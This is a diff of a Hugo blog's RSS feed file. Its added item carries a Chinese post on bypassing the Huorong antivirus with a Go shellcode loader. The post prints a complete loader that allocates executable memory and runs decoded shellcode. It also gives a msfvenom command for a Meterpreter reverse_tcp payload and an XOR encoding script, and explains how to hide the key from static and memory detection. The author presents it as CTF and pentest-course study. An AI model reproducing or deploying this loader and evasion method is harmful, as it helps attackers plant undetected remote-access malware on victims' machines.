@@ -1,19 +1,276 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Go on Boris&#39;s Blog</title>
-    <link>http://localhost:1313/tags/go/</link>
-    <description>Recent content in Go on Boris&#39;s Blog</description>
-    <generator>Hugo</generator>
-    <language>en-us</language>
-    <lastBuildDate>Mon, 03 Jun 2024 16:22:34 +0800</lastBuildDate>
-    <atom:link href="http://localhost:1313/tags/go/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Go语言ShellCode免杀火绒</title>
-      <link>http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</link>
-      <pubDate>Mon, 03 Jun 2024 16:22:34 +0800</pubDate>
-      <guid>http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</guid>
-      <description>1. Shellcode 加载器（go） 我们先看最后的免杀代码 package main import ( &amp;quot;fmt&amp;quot; &amp;quot;os&amp;quot; &amp;quot;syscall&amp;quot; &amp;quot;unsafe&amp;quot; ) const ( MEM_COMMIT = 0x1000 MEM_RESERVE = 0x2000 PAGE_EXECUTE_READWRITE = 0x40 ) var ( kernel32 = syscall.NewLazyDLL(&amp;quot;kernel32.dll&amp;quot;) ntdll = syscall.NewLazyDLL(&amp;quot;ntdll.dll&amp;quot;) VirtualAlloc = kernel32.NewProc(&amp;quot;VirtualAlloc&amp;quot;) RtlCopyMemory = ntdll.NewProc(&amp;quot;RtlCopyMemory&amp;quot;) //shellcode_buf = []byte{ //} shellcode_buf = []byte{ } ) func check(e error) { if e</description>
-    </item>
-  </channel>
+    <channel>
+        <title>Go on Boris&#39;s Blog</title>
+        <link>http://localhost:1313/tags/go/</link>
+        <description>Recent content in Go on Boris&#39;s Blog</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-CN</language>
+        <lastBuildDate>Mon, 03 Jun 2024 16:22:34 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/go/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Go语言ShellCode免杀火绒</title>
+        <link>http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</link>
+        <pubDate>Mon, 03 Jun 2024 16:22:34 +0800</pubDate>
+        
+        <guid>http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</guid>
+        <description>&lt;img src="http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164.png" alt="Featured image of post Go语言ShellCode免杀火绒" /&gt;&lt;h1 id=&#34;1--shellcode-加载器go&#34;&gt;1.  Shellcode 加载器（go）
+&lt;/h1&gt;&lt;p&gt;我们先看最后的免杀代码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+	&amp;quot;fmt&amp;quot;
+	&amp;quot;os&amp;quot;
+	&amp;quot;syscall&amp;quot;
+	&amp;quot;unsafe&amp;quot;
+)
+
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+
+var (
+	kernel32      = syscall.NewLazyDLL(&amp;quot;kernel32.dll&amp;quot;)
+	ntdll         = syscall.NewLazyDLL(&amp;quot;ntdll.dll&amp;quot;)
+	VirtualAlloc  = kernel32.NewProc(&amp;quot;VirtualAlloc&amp;quot;)
+	RtlCopyMemory = ntdll.NewProc(&amp;quot;RtlCopyMemory&amp;quot;)
+	//shellcode_buf = []byte{
+	//}
+	shellcode_buf = []byte{
+	}
+)
+
+func check(e error) {
+	if e != nil {
+		if e.Error() != &amp;quot;The operation completed successfully.&amp;quot; { // 内存错误
+			fmt.Println(e.Error())
+			os.Exit(1)
+		}
+	}
+}
+
+func main() {
+	//// xor
+	homeDir, _ := os.UserHomeDir()
+	xor := homeDir[3] // U -&amp;gt; 85
+	decimalValue := int(xor)
+	shellcode := xorEncrypt(shellcode_buf, decimalValue)
+	//shellcode := shellcode_buf
+
+	fmt.Println(shellcode)
+	// 申请内存
+	// MEM_COMMIT|MEM_RESERVE
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	if addr == 0 {
+		check(err)
+	}
+	// 写入shellcode
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;amp;shellcode[0])), uintptr(len(shellcode)))
+	check(err)
+
+	// 执行shellcode
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func xorEncrypt(buf []byte, value int) []byte {
+	for i := 0; i &amp;lt; len(buf); i++ {
+		buf[i] ^= byte(value)
+	}
+	return buf
+}
+
+// go build -ldflags=&amp;quot;-H windowsgui -w -s&amp;quot; shellcodeLoader.go
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;2-shellcode-生成&#34;&gt;2. shellcode 生成
+&lt;/h1&gt;&lt;p&gt;对于shellcode的生成我们采用msf进行生成：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx -f c
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对于生成的shellcode，我们如果不进行处理，对于火绒这类的杀毒软件来说，做简单的静态分析，如果坚持到0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50···这些关键字节，肯定会报毒：Backdoor/W64.Meterpreter.f&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 314; 
+			flex-basis: 754px&#34;
+	&gt;
+	&lt;a href=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34; data-size=&#34;761x242&#34;&gt;
+		&lt;img src=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34;
+			width=&#34;761&#34;
+			height=&#34;242&#34;
+			srcset=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_480x0_resize_box_3.png 480w, http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;3可能的绕过方式&#34;&gt;3.可能的绕过方式
+&lt;/h1&gt;&lt;p&gt;一般来说，为了防止shellcode被检测到，我们通过对shellcode进行处理，如base64加密，亦或等等操作，也可以考虑github的sgn工具。&lt;/p&gt;
+&lt;p&gt;本文我们主要采用亦或操作（xor）&lt;/p&gt;
+&lt;p&gt;我们先将msf生成的shellcode进行亦或操作：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# xor.py 
+shellcode = []
+
+# xor 85
+shellcode1 = &#39;&#39;.join([&#39;\\x%02x&#39; % i for i in shellcode])
+print(shellcode1)
+for i in range(len(shellcode)):
+    shellcode[i] ^= 85
+
+# 0x格式化输出
+shellcode = &#39;&#39;.join([&#39;\\x%02x&#39; % i for i in shellcode])
+print(shellcode)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 615; 
+			flex-basis: 1478px&#34;
+	&gt;
+	&lt;a href=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png&#34; data-size=&#34;2476x402&#34;&gt;
+		&lt;img src=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png&#34;
+			width=&#34;2476&#34;
+			height=&#34;402&#34;
+			srcset=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu68bb3f7e214e39998f19f09f7eab598b_73178_480x0_resize_box_3.png 480w, http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu68bb3f7e214e39998f19f09f7eab598b_73178_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;再将shellcode进行替换，并且与目标值进行亦或，就可以获得正确的shellcode。&lt;/p&gt;
+&lt;p&gt;但是当我们进行编译的时候，任然报毒。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 314; 
+			flex-basis: 754px&#34;
+	&gt;
+	&lt;a href=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34; data-size=&#34;761x242&#34;&gt;
+		&lt;img src=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34;
+			width=&#34;761&#34;
+			height=&#34;242&#34;
+			srcset=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_480x0_resize_box_3.png 480w, http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu9cfd642fd07fce8fd66523927f7b4328_51356_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
+shellcode := xorEncrypt(shellcode_buf, 85)
+
+func xorEncrypt(buf []byte, value int) []byte {
+	for i := 0; i &amp;lt; len(buf); i++ {
+		buf[i] ^= byte(value)
+	}
+	return buf
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这是由于火绒在检测的时候如果能明确看到85，会尝试亦或来还原shellcode，base64同理。&lt;/p&gt;
+&lt;p&gt;所以我们就尝试如果隐藏85，通过读取用户目录来获取。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
+	homeDir, _ := os.UserHomeDir()
+	xor := homeDir[3] // U -&amp;gt; 85
+	decimalValue := int(xor)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;此时，shellcode是没有问题的，但是在进行编译的时候会遇到内存的报毒：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 309; 
+			flex-basis: 741px&#34;
+	&gt;
+	&lt;a href=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png&#34; data-size=&#34;776x251&#34;&gt;
+		&lt;img src=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png&#34;
+			width=&#34;776&#34;
+			height=&#34;251&#34;
+			srcset=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_huc6139853c71ea2ae99ec210e13bdcc2d_52278_480x0_resize_box_3.png 480w, http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_huc6139853c71ea2ae99ec210e13bdcc2d_52278_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这个原因是我们在申请内存时，设置内存权限为MEM_COMMIT|MEM_RESERVE；&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 254; 
+			flex-basis: 611px&#34;
+	&gt;
+	&lt;a href=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png&#34; data-size=&#34;1100x432&#34;&gt;
+		&lt;img src=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png&#34;
+			width=&#34;1100&#34;
+			height=&#34;432&#34;
+			srcset=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu32dbec9d972f2d35da4af401bd4375f1_335259_480x0_resize_box_3.png 480w, http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu32dbec9d972f2d35da4af401bd4375f1_335259_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 529; 
+			flex-basis: 1270px&#34;
+	&gt;
+	&lt;a href=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png&#34; data-size=&#34;1631x308&#34;&gt;
+		&lt;img src=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png&#34;
+			width=&#34;1631&#34;
+			height=&#34;308&#34;
+			srcset=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu1c25fe5c025c7d21bb1d2be40b9d98eb_173178_480x0_resize_box_3.png 480w, http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu1c25fe5c025c7d21bb1d2be40b9d98eb_173178_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;我们将内存权限设置为MEM_COMMIT就可以了。&lt;/p&gt;
+&lt;h1 id=&#34;4-免杀效果&#34;&gt;4. 免杀效果
+&lt;/h1&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 166; 
+			flex-basis: 398px&#34;
+	&gt;
+	&lt;a href=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png&#34; data-size=&#34;1023x616&#34;&gt;
+		&lt;img src=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png&#34;
+			width=&#34;1023&#34;
+			height=&#34;616&#34;
+			srcset=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu9b6babee500537cd031d39e44c5758e6_33020_480x0_resize_box_3.png 480w, http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu9b6babee500537cd031d39e44c5758e6_33020_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;查看能否上线&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 162; 
+			flex-basis: 390px&#34;
+	&gt;
+	&lt;a href=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png&#34; data-size=&#34;1299x799&#34;&gt;
+		&lt;img src=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png&#34;
+			width=&#34;1299&#34;
+			height=&#34;799&#34;
+			srcset=&#34;http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu8ffe3f08206ee9e5b4940159336c6d6c_76976_480x0_resize_box_3.png 480w, http://localhost:1313/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu8ffe3f08206ee9e5b4940159336c6d6c_76976_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;5-总结&#34;&gt;5. 总结
+&lt;/h1&gt;&lt;p&gt;这是第一次尝试免杀，之前一直在学习pwn和web安全，但是在前段时间的上海市大学生磐石行动的比赛中，发现内网中存在杀毒软件，且无法及时绕过，虽然通过文件包含读取到了flag，但是却阻止了我们进一步的渗透利用，最后也只获得了第十一名，与决赛遗憾错过。&lt;/p&gt;
+&lt;p&gt;回来之后，反思了很多，觉得还是要对免杀进行一部分的学习，go语言的shellcode免杀通过微信推文看到的，决定挺有意思的，便在之后的学习中进行尝试，没想到就成功绕过了火绒（其他杀毒软件还没有尝试过），但是这也激起了我学习的热情。&lt;/p&gt;
+&lt;p&gt;此外，最近也收到了实验室导师的任务，给本科生同学们准备渗透测试（CTF）的课程，也觉得免杀蛮重要的，顺便也一起给讲了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;学无止境，脚踏实地。&lt;/strong&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
 </rss>
